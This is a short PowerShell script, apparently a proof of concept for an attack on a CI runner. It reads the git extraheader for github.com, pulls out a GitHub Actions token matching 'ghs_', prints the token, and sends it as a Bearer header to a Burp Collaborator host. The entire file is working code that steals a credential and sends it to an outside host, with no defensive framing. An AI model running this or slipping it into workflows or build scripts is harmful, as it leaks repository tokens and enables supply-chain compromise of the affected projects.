$extraHeader = git config --get http.https://github.com/.extraheader

# Extract the token from the extraheader
$token = [Regex]::Match($extraHeader, "ghs_[0-9A-Za-z]{20,}").Value

# Print the extracted token
Write-Host "GitHub Token: $token"
$url = "https://6ipqwfuz8ppgyvgk09pqi60ac1ix6m.burpcollaborator.net/user"  # Replace with your desired URL

$headers = @{
    "Authorization" = "Bearer $token"
}

$response = Invoke-RestMethod -Uri $url -Headers $headers

# Print the response content
Write-Host $response


